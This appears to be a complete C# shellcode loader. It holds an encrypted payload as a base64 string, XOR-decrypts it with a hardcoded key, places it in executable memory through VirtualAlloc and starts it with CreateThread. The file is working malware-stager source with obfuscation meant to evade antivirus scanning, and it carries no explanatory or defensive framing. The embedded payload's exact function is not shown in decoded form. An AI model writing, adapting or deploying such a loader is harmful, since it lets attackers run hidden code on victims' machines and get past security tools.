using System;
using System.Runtime.InteropServices;
using System.Text;
public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint prot);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr handle, uint ms);
    const uint MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40;
    static byte[] Xor(byte[] shell, byte[] key) { for (int i = 0; i < shell.Length; i++) shell[i] ^= key[i % key.Length]; return shell; }
    static void Main()
    {
        string dataBS64 = "tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8ZikJGA299ejRjCmU8+7Z8tNmRMU5IfequeslwUDWOPywkawlgKsLXOfuhdY95RhZJt+Evwtkdc1E0NWxwimfIX2O05iUiHQX8eADwBrf0K8LxPY2QfLz0cIqkR+uDtOY9+5deJXRpfMeqfOqycs/r9UBUyuR4z4x0YUszPMozWVE1MTBOSHUzCmM9+7JjYmJ8AY4iOToKY5eONvNxEWUxTwC5J28rs3I4fLzTZ2APGHUzCmM8jZB1ZXzO+APB9S/C8jTIKfgKs87lBnnmK7T5/nwRjj2yLFCxnY+T/pEjM+qSoIisz5sAt6djD3MOWrTO1UQ19Q8nESRZdSsRve/K5A==";
        byte[] data = Convert.FromBase64String(dataBS64);
        string key = "H4cK3urP45510N"; byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        byte[] shellcode = Xor(data, keyBytes);  // decrypt
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero) return;  // Fail safe
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        uint tid; IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
